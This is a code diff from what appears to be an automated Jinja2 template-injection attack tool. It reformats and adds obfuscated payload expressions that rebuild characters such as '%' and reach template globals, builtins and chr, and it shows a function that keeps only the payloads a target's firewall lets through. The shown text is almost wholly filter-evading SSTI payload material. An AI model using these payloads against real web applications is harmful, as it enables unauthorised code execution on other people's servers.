@@ -32,19 +32,13 @@ context_payloads_all: ContextPayloads = {
         "ssbb": 556,
         "zzeb": 223,
     },
-    "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}": {
-        "zols": 2015
-    },
-    "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}": {
-        "ltr": 178
-    },
+    "{%set zols=lipsum|escape|urlencode|list|escape|urlencode|count%}": {"zols": 2015},
+    "{%set ltr={}|escape|urlencode|list|escape|urlencode|count%}": {"ltr": 178},
     "{%set lea=namespace|escape|urlencode|escape|"
     + "urlencode|urlencode|urlencode|count%}": {"lea": 134},
     "{%set lel=cycler|escape|urlencode|escape|urlenc"
     + "ode|escape|urlencode|escape|urlencode|count%}": {"lel": 131},
-    "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}": {
-        "qo": 90
-    },
+    "{%set qo=namespace|escape|urlencode|escape|urlencode|count%}": {"qo": 90},
     "{%set bs=cycler|escape|urlencode|count%}": {"bs": 65},
     "{%set ab=namespace|escape|count%}": {"ab": 46},
     "{%set zb={}|escape|list|escape|count%}": {"zb": 26},
@@ -59,7 +53,14 @@ context_payloads_all: ContextPayloads = {
     + "dict(globals=x)|join+((({}|select()|trim|list)[24]))*2][((({}|select()"
     + "|trim|list)[24]))*2+dict(builtins=x)|join+((({}|select()|trim|list"
     + ")[24]))*2][dict(chr=x)|join](37))%}": {"percc": "%"},
-    "{%set perccc=({0:1}|safe).replace((1|safe).rjust(2),cycler.__name__|batch(3)|first|last).format(37)%}": {"perccc": "%"}
+    "{%set perccc=({0:1}|safe).replace((1|safe).rjust(2),"
+    + "cycler.__name__|batch(3)|first|last).format(((9,9,9,1,9)|sum))%}": {
+        "perccc": "%"
+    },
+    "{%set prrc=((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join"
+    + ",(dict(c=x)|join),dict()|trim|last)|join).format(((9,9,9,1,9)|sum))%}": {
+        "prrc": "%"
+    },
 }
 
 
@@ -75,9 +76,7 @@ def filter_by_waf(
     Returns:
         ContextPayloads: 过滤后的ContextPayload
     """
-    return {
-        payload: d for payload, d in context_payloads.items() if waf(payload)
-    }
+    return {payload: d for payload, d in context_payloads.items() if waf(payload)}
 
 
 def filter_by_used_context(
